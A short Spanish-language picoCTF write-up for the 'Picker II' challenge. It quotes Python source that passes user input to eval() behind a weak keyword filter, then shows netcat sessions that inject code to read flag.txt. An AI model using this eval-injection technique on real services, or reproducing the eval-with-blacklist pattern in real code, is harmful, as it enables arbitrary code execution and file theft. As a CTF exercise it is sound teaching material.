# Reto Picker II

## Descripción 


Can you figure out how this program works to get the flag?
Connect to the program with netcat:
$ nc saturn.picoctf.net 53455
The program's source code can be downloaded here.

## Solución




Descargamos el código fuente que nos dan con el reto y lo analizamos, el programa ejecuta la función que se le pasa como parámetro, pero filtra la llamada a la función win:

```python
def filter(user_input):
  if 'win' in user_input:
    return False
  return True

while(True):
  try:
    user_input = input('==> ')
    if( filter(user_input) ):
      eval(user_input + '()')
    else:
      print('Illegal input')
  except Exception as e:
    print(e)
    break
```
Verificamos si la llamada a eval() dentro de la función principal ejecuta lo que le pasamos

````
nc saturn.picoctf.net 64571
==> print(4*4)
16
'NoneType' object is not callable

Replicamos lo que la función win() hace y leemos la bandera directamente
nc saturn.picoctf.net 64571
==> print(open('flag.txt','r').read())
picoCTF{...}
'NoneType' object is not callable




